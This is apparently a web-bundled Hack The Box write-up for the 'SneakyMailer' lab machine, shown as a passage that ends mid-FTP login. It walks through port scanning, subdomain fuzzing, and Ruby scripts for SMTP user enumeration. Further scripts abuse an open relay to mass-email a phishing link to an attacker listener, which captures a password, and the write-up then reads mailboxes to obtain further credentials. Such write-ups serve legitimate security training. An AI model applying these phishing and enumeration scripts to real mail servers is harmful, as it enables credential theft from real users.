"use strict";(self.webpackChunkcyfun_me=self.webpackChunkcyfun_me||[]).push([[90],{3905:(e,n,t)=>{t.d(n,{Zo:()=>c,kt:()=>h});var r=t(67294);function a(e,n,t){return n in e?Object.defineProperty(e,n,{value:t,enumerable:!0,configurable:!0,writable:!0}):e[n]=t,e}function o(e,n){var t=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);n&&(r=r.filter((function(n){return Object.getOwnPropertyDescriptor(e,n).enumerable}))),t.push.apply(t,r)}return t}function s(e){for(var n=1;n<arguments.length;n++){var t=null!=arguments[n]?arguments[n]:{};n%2?o(Object(t),!0).forEach((function(n){a(e,n,t[n])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(t)):o(Object(t)).forEach((function(n){Object.defineProperty(e,n,Object.getOwnPropertyDescriptor(t,n))}))}return e}function i(e,n){if(null==e)return{};var t,r,a=function(e,n){if(null==e)return{};var t,r,a={},o=Object.keys(e);for(r=0;r<o.length;r++)t=o[r],n.indexOf(t)>=0||(a[t]=e[t]);return a}(e,n);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);for(r=0;r<o.length;r++)t=o[r],n.indexOf(t)>=0||Object.prototype.propertyIsEnumerable.call(e,t)&&(a[t]=e[t])}return a}var p=r.createContext({}),l=function(e){var n=r.useContext(p),t=n;return e&&(t="function"==typeof e?e(n):s(s({},n),e)),t},c=function(e){var n=l(e.components);return r.createElement(p.Provider,{value:n},e.children)},u="mdxType",d={inlineCode:"code",wrapper:function(e){var n=e.children;return r.createElement(r.Fragment,{},n)}},m=r.forwardRef((function(e,n){var t=e.components,a=e.mdxType,o=e.originalType,p=e.parentName,c=i(e,["components","mdxType","originalType","parentName"]),u=l(t),m=a,h=u["".concat(p,".").concat(m)]||u[m]||d[m]||o;return t?r.createElement(h,s(s({ref:n},c),{},{components:t})):r.createElement(h,s({ref:n},c))}));function h(e,n){var t=arguments,a=n&&n.mdxType;if("string"==typeof e||a){var o=t.length,s=new Array(o);s[0]=m;var i={};for(var p in n)hasOwnProperty.call(n,p)&&(i[p]=n[p]);i.originalType=e,i[u]="string"==typeof e?e:a,s[1]=i;for(var l=2;l<o;l++)s[l]=t[l];return r.createElement.apply(null,s)}return r.createElement.apply(null,t)}m.displayName="MDXCreateElement"},23437:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>p,contentTitle:()=>s,default:()=>d,frontMatter:()=>o,metadata:()=>i,toc:()=>l});var r=t(87462),a=(t(67294),t(3905));const o={layout:"post",title:"SneakyMailer ",lang:"en",categories:["writeups"],tags:["security","writeups","linux","pe","smtp","imap","ftp","python","htb"],date:"2020/11/28 13:47:00",thumbnail:"/img/HackTheBox/sneakymailer.png",toc:!0},s="Information",i={unversionedId:"HackTheBox/SneakyMailer/write-up",id:"HackTheBox/SneakyMailer/write-up",title:"SneakyMailer ",description:"- Name: SneakyMailer",source:"@site/writeups/HackTheBox/SneakyMailer/write-up.md",sourceDirName:"HackTheBox/SneakyMailer",slug:"/HackTheBox/SneakyMailer/write-up",permalink:"/writeups/HackTheBox/SneakyMailer/write-up",draft:!1,tags:[{label:"security",permalink:"/writeups/tags/security"},{label:"writeups",permalink:"/writeups/tags/writeups"},{label:"linux",permalink:"/writeups/tags/linux"},{label:"pe",permalink:"/writeups/tags/pe"},{label:"smtp",permalink:"/writeups/tags/smtp"},{label:"imap",permalink:"/writeups/tags/imap"},{label:"ftp",permalink:"/writeups/tags/ftp"},{label:"python",permalink:"/writeups/tags/python"},{label:"htb",permalink:"/writeups/tags/htb"}],version:"current",frontMatter:{layout:"post",title:"SneakyMailer ",lang:"en",categories:["writeups"],tags:["security","writeups","linux","pe","smtp","imap","ftp","python","htb"],date:"2020/11/28 13:47:00",thumbnail:"/img/HackTheBox/sneakymailer.png",toc:!0},sidebar:"tutorialSidebar",previous:{title:"ServMon ",permalink:"/writeups/HackTheBox/ServMon/write-up"},next:{title:"Tabby ",permalink:"/writeups/HackTheBox/Tabby/write-up"}},p={},l=[{value:"Overview",id:"overview",level:2},{value:"Network enumeration",id:"network-enumeration",level:2},{value:"HTTP enumeration",id:"http-enumeration",level:2},{value:"Service discovery",id:"service-discovery",level:2},{value:"SMTP &amp; IMAP exploitation",id:"smtp--imap-exploitation",level:2},{value:"FTP access",id:"ftp-access",level:2},{value:"Privilege Escalation of Machine : from www-data to developer",id:"privilege-escalation-of-machine--from-www-data-to-developer",level:2},{value:"Privilege Escalation of Machine : from developer to low",id:"privilege-escalation-of-machine--from-developer-to-low",level:2},{value:"Privilege Escalation of Machine : from low to root",id:"privilege-escalation-of-machine--from-low-to-root",level:2}],c={toc:l},u="wrapper";function d(e){let{components:n,...o}=e;return(0,a.kt)(u,(0,r.Z)({},c,o,{components:n,mdxType:"MDXLayout"}),(0,a.kt)("h1",{id:"information"},"Information"),(0,a.kt)("ul",null,(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("strong",{parentName:"li"},"Name:")," SneakyMailer"),(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("strong",{parentName:"li"},"Profile:")," ",(0,a.kt)("a",{parentName:"li",href:"https://www.hackthebox.eu/home/machines/profile/262"},"www.hackthebox.eu")),(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("strong",{parentName:"li"},"Difficulty:")," Medium"),(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("strong",{parentName:"li"},"OS:")," Linux"),(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("strong",{parentName:"li"},"Points:")," 30")),(0,a.kt)("p",null,(0,a.kt)("img",{alt:"SneakyMailer",src:t(15971).Z,width:"598",height:"381"})),(0,a.kt)("h2",{id:"overview"},"Overview"),(0,a.kt)("p",null,"Install tools used in this WU on BlackArch Linux:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"$ pacman -S nmap ffuf lynx ruby ruby-nokogiri swaks pwncat evolution filezilla\n")),(0,a.kt)("h2",{id:"network-enumeration"},"Network enumeration"),(0,a.kt)("p",null,"Port & service discovery with ",(0,a.kt)("a",{parentName:"p",href:"https://nmap.org/"},"nmap"),":"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"# Nmap 7.80 scan initiated Sun Nov  8 16:50:55 2020 as: nmap -sSVC -p- -oA nmap_full -v 10.10.10.197\nNmap scan report for 10.10.10.197\nHost is up (0.022s latency).\nNot shown: 65528 closed ports\nPORT     STATE SERVICE  VERSION\n21/tcp   open  ftp      vsftpd 3.0.3\n22/tcp   open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)\n| ssh-hostkey:\n|   2048 57:c9:00:35:36:56:e6:6f:f6:de:86:40:b2:ee:3e:fd (RSA)\n|   256 d8:21:23:28:1d:b8:30:46:e2:67:2d:59:65:f0:0a:05 (ECDSA)\n|_  256 5e:4f:23:4e:d4:90:8e:e9:5e:89:74:b3:19:0c:fc:1a (ED25519)\n25/tcp   open  smtp     Postfix smtpd\n|_smtp-commands: debian, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING,\n80/tcp   open  http     nginx 1.14.2\n| http-methods:\n|_  Supported Methods: GET HEAD POST OPTIONS\n|_http-server-header: nginx/1.14.2\n|_http-title: Did not follow redirect to http://sneakycorp.htb\n143/tcp  open  imap     Courier Imapd (released 2018)\n|_imap-capabilities: THREAD=ORDEREDSUBJECT IMAP4rev1 IDLE THREAD=REFERENCES SORT ENABLE ACL2=UNION UIDPLUS STARTTLS completed ACL CHILDREN UTF8=ACCEPTA0001 NAMESPACE OK QUOTA CAPABILITY\n| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US\n| Subject Alternative Name: email:postmaster@example.com\n| Issuer: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US\n| Public Key type: rsa\n| Public Key bits: 3072\n| Signature Algorithm: sha256WithRSAEncryption\n| Not valid before: 2020-05-14T17:14:21\n| Not valid after:  2021-05-14T17:14:21\n| MD5:   3faf 4166 f274 83c5 8161 03ed f9c2 0308\n|_SHA-1: f79f 040b 2cd7 afe0 31fa 08c3 b30a 5ff5 7b63 566c\n|_ssl-date: TLS randomness does not represent time\n993/tcp  open  ssl/imap Courier Imapd (released 2018)\n|_imap-capabilities: THREAD=ORDEREDSUBJECT IMAP4rev1 IDLE THREAD=REFERENCES SORT ENABLE ACL2=UNION UIDPLUS completed ACL CHILDREN UTF8=ACCEPTA0001 AUTH=PLAIN NAMESPACE OK QUOTA CAPABILITY\n| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US\n| Subject Alternative Name: email:postmaster@example.com\n| Issuer: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US\n| Public Key type: rsa\n| Public Key bits: 3072\n| Signature Algorithm: sha256WithRSAEncryption\n| Not valid before: 2020-05-14T17:14:21\n| Not valid after:  2021-05-14T17:14:21\n| MD5:   3faf 4166 f274 83c5 8161 03ed f9c2 0308\n|_SHA-1: f79f 040b 2cd7 afe0 31fa 08c3 b30a 5ff5 7b63 566c\n|_ssl-date: TLS randomness does not represent time\n8080/tcp open  http     nginx 1.14.2\n| http-methods:\n|_  Supported Methods: GET HEAD\n|_http-open-proxy: Proxy might be redirecting requests\n|_http-server-header: nginx/1.14.2\n|_http-title: Welcome to nginx!\nService Info: Host:  debian; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\n\nRead data files from: /usr/bin/../share/nmap\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n# Nmap done at Sun Nov  8 16:51:55 2020 -- 1 IP address (1 host up) scanned in 60.40 seconds\n")),(0,a.kt)("p",null,"We can see there is a redirect from the web server on port 80 to ",(0,a.kt)("a",{parentName:"p",href:"http://sneakycorp.htb"},"http://sneakycorp.htb"),",\nso let's add this local domain to ",(0,a.kt)("inlineCode",{parentName:"p"},"/etc/hosts"),":"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"$ cat /etc/hosts | grep sneak\n10.10.10.197 sneakycorp.htb\n")),(0,a.kt)("h2",{id:"http-enumeration"},"HTTP enumeration"),(0,a.kt)("p",null,"Let's see if we can find links:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"$ lynx -dump -listonly -nonumbers http://sneakycorp.htb/\n   Visible links:\nhttp://sneakycorp.htb/index.php\nhttp://sneakycorp.htb/team.php\nhttp://sneakycorp.htb/\nhttp://sneakycorp.htb/\nhttp://sneakycorp.htb/\nhttp://sneakycorp.htb/\nhttp://sneakycorp.htb/\n\n   Hidden links:\nhttp://sneakycorp.htb/index.php\nhttp://sneakycorp.htb/\nhttp://sneakycorp.htb/\nhttp://sneakycorp.htb/\nhttp://sneakycorp.htb/\nhttp://sneakycorp.htb/\nhttp://sneakycorp.htb/\nhttp://sneakycorp.htb/#page-top\n")),(0,a.kt)("p",null,"Nothing useful, maybe the team page if we have a bruteforce to perform later."),(0,a.kt)("p",null,"Now we can try to find some sub-domains:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"$ ffuf -u http://sneakycorp.htb/ -c -w ~/CTF/tools/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt -H 'Host: FUZZ.sneakycorp.htb' -ac\n\n        /'___\\  /'___\\           /'___\\\n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/\n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\\n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/\n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\\n          \\/_/    \\/_/   \\/___/    \\/_/\n\n       v1.2.0-git\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://sneakycorp.htb/\n :: Wordlist         : FUZZ: /home/cyfun/CTF/tools/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt\n :: Header           : Host: FUZZ.sneakycorp.htb\n :: Follow redirects : false\n :: Calibration      : true\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200,204,301,302,307,401,403\n :: Filter           : Response size: 185\n :: Filter           : Response words: 6\n :: Filter           : Response lines: 8\n________________________________________________\n\ndev                     [Status: 200, Size: 13737, Words: 4007, Lines: 341]\n:: Progress: [38267/38267] :: Job [1/1] :: 1807 req/sec :: Duration: [0:00:22] :: Errors: 0 ::\n")),(0,a.kt)("p",null,"We can add ",(0,a.kt)("inlineCode",{parentName:"p"},"dev.sneakycorp.htb")," to ",(0,a.kt)("inlineCode",{parentName:"p"},"/etc/hosts"),":"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"$ cat /etc/hosts | grep sneak\n10.10.10.197 sneakycorp.htb dev.sneakycorp.htb\n")),(0,a.kt)("p",null,"The dev site looks the same but there is an additional page:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"$ lynx -dump -listonly -nonumbers http://dev.sneakycorp.htb/\n   Visible links:\nhttp://dev.sneakycorp.htb/index.php\nhttp://dev.sneakycorp.htb/team.php\nhttp://dev.sneakycorp.htb/pypi/register.php\nhttp://dev.sneakycorp.htb/\nhttp://dev.sneakycorp.htb/\nhttp://dev.sneakycorp.htb/\nhttp://dev.sneakycorp.htb/\nhttp://dev.sneakycorp.htb/\n\n   Hidden links:\nhttp://dev.sneakycorp.htb/index.php\nhttp://dev.sneakycorp.htb/\nhttp://dev.sneakycorp.htb/\nhttp://dev.sneakycorp.htb/\nhttp://dev.sneakycorp.htb/\nhttp://dev.sneakycorp.htb/\nhttp://dev.sneakycorp.htb/\nhttp://dev.sneakycorp.htb/#page-top\n")),(0,a.kt)("p",null,"Let's try to register an account at ",(0,a.kt)("a",{parentName:"p",href:"http://dev.sneakycorp.htb/pypi/register.php"},"http://dev.sneakycorp.htb/pypi/register.php")),(0,a.kt)("p",null,"We don't know if it's working or if it's a rabbit hole and there is no login\npage anyway."),(0,a.kt)("h2",{id:"service-discovery"},"Service discovery"),(0,a.kt)("p",null,"The FTP is not accessible anonymously and we don't have credentials yet."),(0,a.kt)("p",null,"There are a SMTP and IMAP server. This also another web server on port 8080\nbut found nothing while enumerating."),(0,a.kt)("h2",{id:"smtp--imap-exploitation"},"SMTP & IMAP exploitation"),(0,a.kt)("p",null,"Let's connect to the SMTP server and try to verify some email addresses:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"$ ncat sneakycorp.htb 25\n220 debian ESMTP Postfix (Debian/GNU)\nvrfy cyfun@sneakymailer.htb\n550 5.1.1 <cyfun@sneakymailer.htb>: Recipient address rejected: User unknown in virtual mailbox table\nvrfy airisatou@sneakymailer.htb\n252 2.0.0 airisatou@sneakymailer.htb\n")),(0,a.kt)("p",null,"So it means our account was not created after filling the registration form\nbut emails listed on the team page seem valid."),(0,a.kt)("p",null,"I wrote a short ruby script to scrap & parse the website to extract the email\naddresses:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-ruby"},"#! /usr/bin/env ruby\n\nrequire 'nokogiri'\nrequire 'open-uri'\n\ndoc = Nokogiri::HTML(URI.open('http://sneakycorp.htb/team.php'))\ncells = doc.search('table#dataTable tbody tr td')\n\ncells.each do |c|\n    puts c.text if /@sneakymailer.htb/.match?(c)\nend\n")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"$ ruby grab_email.rb > emails.txt\n")),(0,a.kt)("p",null,"If we want to verify all email addresses, we can re-use a\n",(0,a.kt)("a",{parentName:"p",href:"https://rubyfu.net/module-0x3-or-network-kung-fu/email/smtp-enumeration"},"Rubyfu - SMTP Enumeration"),"\nscript and modify it a bit."),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-ruby"},'#!/usr/bin/env ruby\n\nrequire \'socket\'\n\nusers = File.read(\'emails.txt\').split("\\n")\nfound = []\n\n@s = TCPSocket.new(\'sneakycorp.htb\', 25)\n@banner = @s.recv(1024).chomp\nusers.each do |user|\n  @s.send "VRFY #{user} \\n\\r", 0\n  resp = @s.recv(1024).chomp\n  found << user if resp.split[2] == user\nend\n@s.close\n\nputs "[*] Result:-"\nputs "[+] Banner: " + @banner\nputs "[+] Found users: \\n#{found.join("\\n")}"\n')),(0,a.kt)("p",null,"In theory there is ",(0,a.kt)("a",{parentName:"p",href:"https://nmap.org/"},"nmap")," script for that too but it didn't work in my case:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"$ nmap --script smtp-enum-users.nse --script-args smtp-enum-users.methods={VRFY},userdb=$(pwd)/emails.txt -p 25 sneakycorp.htb\n")),(0,a.kt)("p",null,"We can use another script to very available commands:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"$ nmap --script smtp-commands.nse -pT:25 sneakycorp.htb\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-11-08 19:03 CET\nNmap scan report for sneakycorp.htb (10.10.10.197)\nHost is up (0.022s latency).\n\nPORT   STATE SERVICE\n25/tcp open  smtp\n|_smtp-commands: debian, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING,\n\nNmap done: 1 IP address (1 host up) scanned in 10.36 seconds\n")),(0,a.kt)("p",null,"There is another script to check for open relay but it doesn't work here\n(maybe because the anti-spam test target nmap.scanme.org by default)."),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"$ nmap --script smtp-open-relay.nse  -p 25 sneakycorp.htb --script-args smtp-open-relay.to=tigernixon@sneakymailer.htb,smtp-open-relay.from=cyfun@sneakymailer.htb\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-11-08 19:09 CET\nNmap scan report for sneakycorp.htb (10.10.10.197)\nHost is up (0.023s latency).\n\nPORT   STATE SERVICE\n25/tcp open  smtp\n|_smtp-open-relay: Server doesn't seem to be an open relay, all tests failed\n\nNmap done: 1 IP address (1 host up) scanned in 29.45 seconds\n")),(0,a.kt)("p",null,"Before going farther I checked we can't read emails from the account we\nregistered. The ",(0,a.kt)("a",{parentName:"p",href:"https://book.hacktricks.xyz/pentesting/pentesting-imap#syntax"},"HackTricks - IMAP Syntax"),"\nwas useful for that."),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},'$ ncat sneakycorp.htb 143\n* OK [CAPABILITY IMAP4rev1 UIDPLUS CHILDREN NAMESPACE THREAD=ORDEREDSUBJECT THREAD=REFERENCES SORT QUOTA IDLE ACL ACL2=UNION STARTTLS ENABLE UTF8=ACCEPT] Courier-IMAP ready. Copyright 1998-2018 Double Precision, Inc.  See COPYING for distribution information.\nA1 LOGIN "cyfun@sneakymailer.htb" "password"\nA1 NO Login failed.\n')),(0,a.kt)("p",null,"I seems the SMTP server is vulnerable to open relay:"),(0,a.kt)("blockquote",null,(0,a.kt)("p",{parentName:"blockquote"},"An SMTP server that works as an open relay, is a email server that does not verify if the user is authorised to send email from the specified email address. Therefore, users would be able to send email originating from any third-party email address that they want.")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"$ ncat sneakycorp.htb 25\nMA220 debian ESMTP Postfix (Debian/GNU)\nMAIL from:cyfun@sneakymailer.htb\n250 2.1.0 Ok\nRCPT to:tigernixon@sneakymailer.htb\n250 2.1.5 Ok\nDATA\n354 End data with <CR><LF>.<CR><LF>\nhello open relay\n.\n250 2.0.0 Ok: queued as 4773E25011\n")),(0,a.kt)("p",null,"I wrote a script to abuse of SMTP open relay and send a test email to all users:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-ruby"},'#!/usr/bin/env ruby\n\nrequire \'socket\'\n\nusers = File.read(\'emails.txt\').split("\\n")\n\n@s = TCPSocket.new(\'sneakycorp.htb\', 25)\n@banner = @s.recv(1024).chomp\nusers.each do |user|\n  @s.send "MAIL from:cyfun@sneakymailer.htb \\n\\r", 0\n  @s.send "RCPT to:#{user} \\n\\r", 0\n  @s.send "DATA \\n\\r", 0\n  @s.send "test \\r\\n.\\r\\n", 0\n  resp = @s.recv(1024).chomp\n  puts resp\nend\n@s.close\n\nputs "[*] Result:-"\nputs "[+] Banner: " + @banner\n')),(0,a.kt)("p",null,"Let's change the email body content, replacing test by phishing content\nlike a link to our web server and hope one of the users will click it."),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-ruby"},'#!/usr/bin/env ruby\n\nrequire \'socket\'\n\nusers = File.read(\'emails.txt\').split("\\n")\n\n@s = TCPSocket.new(\'sneakycorp.htb\', 25)\n@banner = @s.recv(1024).chomp\nusers.each do |user|\n  @s.send "MAIL from:cyfun@sneakymailer.htb \\n\\r", 0\n  @s.send "RCPT to:#{user} \\n\\r", 0\n  @s.send "DATA \\n\\r", 0\n  @s.send "http://10.10.14.142:8080 \\r\\n.\\r\\n", 0\n  resp = @s.recv(1024).chomp\n  puts resp\nend\n@s.close\n\nputs "[*] Result:-"\nputs "[+] Banner: " + @banner\n')),(0,a.kt)("p",null,"Nice Paul felt into the trick:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"$ pwncat -l 8080 -vv\nINFO: Listening on :::8080 (family 10/IPv6, TCP)\nINFO: Listening on 0.0.0.0:8080 (family 2/IPv4, TCP)\nINFO: Client connected from 10.10.10.197:52994 (family 2/IPv4, TCP)\nPOST / HTTP/1.1\nHost: 10.10.14.142:8080\nUser-Agent: python-requests/2.23.0\nAccept-Encoding: gzip, deflate\nAccept: */*\nConnection: keep-alive\nContent-Length: 185\nContent-Type: application/x-www-form-urlencoded\n\nfirstName=Paul&lastName=Byrd&email=paulbyrd%40sneakymailer.htb&password=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt&rpassword=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt\n")),(0,a.kt)("p",null,"Let's URL decode the POST body:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-ruby"},"$ irb\nirb(main):001:0> require 'cgi'\n=> true\nirb(main):002:0> puts CGI.unescape('firstName=Paul&lastName=Byrd&email=paulbyrd%40sneakymailer.htb&password=%5E%28%23J\n%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt&rpassword=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt')\nfirstName=Paul&lastName=Byrd&email=paulbyrd@sneakymailer.htb&password=^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht&rpassword=^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht\n=> ni\n")),(0,a.kt)("p",null,"So here are our creds: ",(0,a.kt)("inlineCode",{parentName:"p"},"paulbyrd@sneakymailer.htb")," / ",(0,a.kt)("inlineCode",{parentName:"p"},"^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht"),"."),(0,a.kt)("p",null,"It seems that the username is not the full email address:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},'$ ncat sneakycorp.htb 143\n* OK [CAPABILITY IMAP4rev1 UIDPLUS CHILDREN NAMESPACE THREAD=ORDEREDSUBJECT THREAD=REFERENCES SORT QUOTA IDLE ACL ACL2=UNION STARTTLS ENABLE UTF8=ACCEPT] Courier-IMAP ready. Copyright 1998-2018 Double Precision, Inc.  See COPYING for distribution information.\nA1 LOGIN "paulbyrd@sneakymailer.htb" "^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht"\nA1 NO Login failed.\n^C\n\n$ ncat sneakycorp.htb 143\n* OK [CAPABILITY IMAP4rev1 UIDPLUS CHILDREN NAMESPACE THREAD=ORDEREDSUBJECT THREAD=REFERENCES SORT QUOTA IDLE ACL ACL2=UNION STARTTLS ENABLE UTF8=ACCEPT] Courier-IMAP ready. Copyright 1998-2018 Double Precision, Inc.  See COPYING for distribution information.\nA1 LOGIN "paulbyrd" "^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht"\n* OK [ALERT] Filesystem notification initialization error -- contact your mail administrator (check for configuration errors with the FAM/Gamin library)\nA1 OK LOGIN Ok.\nA1 LIST "" *\n* LIST (\\Unmarked \\HasChildren) "." "INBOX"\n* LIST (\\HasNoChildren) "." "INBOX.Trash"\n* LIST (\\HasNoChildren) "." "INBOX.Sent"\n* LIST (\\HasNoChildren) "." "INBOX.Deleted Items"\n* LIST (\\HasNoChildren) "." "INBOX.Queue"\n* LIST (\\HasNoChildren) "." "INBOX.Sent Items"\n* LIST (\\HasNoChildren) "." "INBOX.Drafts"\nA1 OK LIST completed\n')),(0,a.kt)("p",null,"I tried to connect to the IMAP server with Thunderbird and Kube but it\nwasn't working but when I tried with Evolution it worked."),(0,a.kt)("p",null,"But it's possible to continue via raw IMAP:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},'A1 LIST "INBOX.Sent Items" *\nA1 OK LIST completed\nA1 SELECT "INBOX.Sent Items"\n* FLAGS (\\Draft \\Answered \\Flagged \\Deleted \\Seen \\Recent)\n* OK [PERMANENTFLAGS (\\* \\Draft \\Answered \\Flagged \\Deleted \\Seen)] Limited\n* 2 EXISTS\n* 0 RECENT\n* OK [UIDVALIDITY 589480766] Ok\n* OK [MYRIGHTS "acdilrsw"] ACL\nA1 OK [READ-WRITE] Ok\nA1 FETCH 2 all\n* 2 FETCH (FLAGS (\\Seen) INTERNALDATE "23-Jun-2020 09:27:08 -0400" RFC822.SIZE 585 ENVELOPE ("Wed, 27 May 2020 13:28:58 -0400" "Module testing" (("Paul Byrd" NIL "paulbyrd" "sneakymailer.htb")) (("Paul Byrd" NIL "paulbyrd" "sneakymailer.htb")) (("Paul Byrd" NIL "paulbyrd" "sneakymailer.htb")) ((NIL NIL "low" "debian")) NIL NIL NIL "<4d08007d-3f7e-95ee-858a-40c6e04581bb@sneakymailer.htb>"))\nA1 OK FETCH completed.\nA1 FETCH 1 all\n* 1 FETCH (FLAGS (\\Seen) INTERNALDATE "27-May-2020 13:43:07 -0400" RFC822.SIZE 2167 ENVELOPE ("Fri, 15 May 2020 13:03:37 -0500" "Password reset" (("Paul Byrd" NIL "paulbyrd" "sneakymailer.htb")) (("Paul Byrd" NIL "paulbyrd" "sneakymailer.htb")) (("Paul Byrd" NIL "paulbyrd" "sneakymailer.htb")) (("root" NIL "root" "debian")) NIL NIL NIL NIL))\nA1 OK FETCH completed.\nA1 FETCH 2 body[text]\n* 2 FETCH (BODY[TEXT] {166}\nHello low\n\n\nYour current task is to install, test and then erase every python module you\nfind in our PyPI service, let me know if you have any inconvenience.\n\n)\nA1 OK FETCH completed.\nA1 FETCH 1 body[text]\n* 1 FETCH (BODY[TEXT] {1888}\n--_21F4C0AC-AA5F-47F8-9F7F-7CB64B1169AD_\nContent-Transfer-Encoding: quoted-printable\nContent-Type: text/plain; charset="utf-8"\n\nHello administrator, I want to change this password for the developer accou=\nnt\n\nUsername: developer\nOriginal-Password: m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C\n\nPlease notify me when you do it=20\n\n--_21F4C0AC-AA5F-47F8-9F7F-7CB64B1169AD_\nContent-Transfer-Encoding: quoted-printable\nContent-Type: text/html; charset="utf-8"\n\n<html xmlns:o=3D"urn:schemas-microsoft-com:office:office" xmlns:w=3D"urn:sc=\nhemas-microsoft-com:office:word" xmlns:m=3D"http://schemas.microsoft.com/of=\nfice/2004/12/omml" xmlns=3D"http://www.w3.org/TR/REC-html40"><head><meta ht=\ntp-equiv=3DContent-Type content=3D"text/html; charset=3Dutf-8"><meta name=\n=3DGenerator content=3D"Microsoft Word 15 (filtered medium)"><style>\x3c!--\n/* Font Definitions */\n@font-face\n        {font-family:"Cambria Math";\n        panose-1:2 4 5 3 5 4 6 3 2 4;}\n@font-face\n        {font-family:Calibri;\n        panose-1:2 15 5 2 2 2 4 3 2 4;}\n/* Style Definitions */\np.MsoNormal, li.MsoNormal, div.MsoNormal\n        {margin:0in;\n        margin-bottom:.0001pt;\n        font-size:11.0pt;\n        font-family:"Calibri",sans-serif;}\n.MsoChpDefault\n        {mso-style-type:export-only;}\n@page WordSection1\n        {size:8.5in 11.0in;\n        margin:1.0in 1.0in 1.0in 1.0in;}\ndiv.WordSection1\n        {page:WordSection1;}\n--\x3e</style></head><body lang=3DEN-US link=3Dblue vlink=3D"#954F72"><div cla=\nss=3DWordSection1><p class=3DMsoNormal>Hello administrator, I want to chang=\ne this password for the developer account</p><p class=3DMsoNormal><o:p>&nbs=\np;</o:p></p><p class=3DMsoNormal>Username: developer</p><p class=3DMsoNorma=\nl>Original-Password: m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C</p><p class=3DMsoNorm=\nal><o:p>&nbsp;</o:p></p><p class=3DMsoNormal>Please notify me when you do i=\nt </p></div></body></html>=\n\n--_21F4C0AC-AA5F-47F8-9F7F-7CB64B1169AD_--\n)\nA1 OK FETCH completed.\n')),(0,a.kt)("p",null,"Let's try those creds: ",(0,a.kt)("inlineCode",{parentName:"p"},"developer")," / ",(0,a.kt)("inlineCode",{parentName:"p"},"m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C")," and then mess with pypi modules."),(0,a.kt)("h2",{id:"ftp-access"},"FTP access"),(0,a.kt)("p",null,"The credentials are working on the FTP server:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"$ ftp sneakycorp.htb\nConnected to sneakycorp.htb.\n220 (vsFTPd 3.0.3)\nName (sneakycorp.htb:cyfun): developer\n331 Please specify the password.\nPassword:\n230 